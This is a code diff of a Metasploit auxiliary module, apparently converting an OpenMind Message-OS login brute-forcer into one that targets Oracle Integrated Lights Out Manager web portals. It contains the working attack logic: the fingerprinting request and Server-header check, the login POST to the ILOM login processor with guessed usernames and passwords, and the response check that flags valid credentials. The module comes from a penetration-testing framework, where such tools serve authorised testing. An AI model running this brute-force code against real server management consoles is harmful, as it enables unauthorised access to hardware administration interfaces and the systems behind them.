@@ -14,30 +14,28 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => 'OpenMind Message-OS Portal Login Brute Force Utility',
+      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',
       'Description'    => %{
-        This module scans for OpenMind Message-OS provisioning web login portal, and
+        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
         performs a login brute force attack to identify valid credentials.
       },
       'Author'         =>
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
 
-    ))
+      'DefaultOptions' => { 'SSL' => true }
+  ))
 
     register_options(
       [
-        Opt::RPORT(8888),
-        OptString.new('TARGETURI', [true, "URI for Web login", "/provision/index.php"]),
-        OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
-        OptString.new('PASSWORD', [true, "A specific password to authenticate with", "admin"])
+        Opt::RPORT(443)
       ], self.class)
   end
 
   def run_host(ip)
-    unless is_app_openmind?
+    unless is_app_oilom?
       return
     end
 
@@ -48,14 +46,14 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   #
-  # What's the point of running this module if the target actually isn't OpenMind
+  # What's the point of running this module if the target actually isn't Oracle ILOM
   #
 
-  def is_app_openmind?
+  def is_app_oilom?
     begin
       res = send_request_cgi(
       {
-        'uri'       => '/',
+        'uri'       => '/iPages/i_login.asp',
         'method'    => 'GET'
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
@@ -63,11 +61,11 @@ class Metasploit3 < Msf::Auxiliary
       return false
     end
 
-    if (res and res.code == 302 and res.headers['Location'] and res.headers['Location'].include?("/provision/index.php"))
-      vprint_good("#{peer} - Running OpenMind Message-OS Provisioning portal...")
+    if (res and res.code == 200 and res.headers['Server'].include?("Oracle-ILOM-Web-Server") and res.body.include?("Integrated Lights Out Manager"))
+      vprint_good("#{peer} - Running Oracle Integrated Lights Out Manager portal...")
       return true
     else
-      vprint_error("#{peer} - Application is not OpenMind. Module will not continue.")
+      vprint_error("#{peer} - Application is not Oracle ILOM. Module will not continue.")
       return false
     end
   end
@@ -81,12 +79,14 @@ class Metasploit3 < Msf::Auxiliary
     begin
       res = send_request_cgi(
       {
-        'uri'       => target_uri.to_s,
+        'uri'       => '/iPages/loginProcessor.asp',
         'method'    => 'POST',
         'vars_post' =>
           {
-            'f_user' => user,
-            'f_pass' => pass
+            'sclink' => '',
+            'username' => user,
+            'password' => pass,
+            'button' => 'Log+In'
           }
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
@@ -94,12 +94,12 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
 
-    if (res and res.code == 302 and res.headers['Location'].include?("frameset"))
+    if (res and res.code == 200 and res.body.include?("/iPages/suntab.asp") and res.body.include?("SetWebSessionString"))
       print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
       report_hash = {
         :host   => rhost,
         :port   => rport,
-        :sname  => 'OpenMind Message-OS Provisioning Portal',
+        :sname  => 'Oracle Integrated Lights Out Manager Portal',
         :user   => user,
         :pass   => pass,
         :active => true,
